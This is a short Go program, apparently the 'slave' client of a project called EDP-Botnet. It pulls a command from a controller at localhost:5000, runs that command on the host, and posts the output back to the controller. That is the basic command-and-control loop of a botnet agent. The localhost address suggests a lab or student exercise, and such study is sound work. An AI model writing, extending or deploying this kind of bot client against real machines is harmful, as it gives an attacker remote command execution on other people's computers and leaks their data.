package main

import (
	"log"
	"os"

	slave "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
)

func main() {
	l := log.New(os.Stdout, "slave-logger", log.LstdFlags)
	s := slave.NewSlave(l)
	url := "http://localhost:5000"
	comando := s.RecvCmd(url + "/command")

	// log.Printf("Command: %#v\n", comando)

	resp := s.ExecCmd(comando)

	// log.Printf("Response from ExecCmd: %#v\n", resp)
	respStatus := s.SendCmd(url+"/send", resp.Bytes())

	log.Printf("Response Status from SendCmd: %#v\n", respStatus)
}
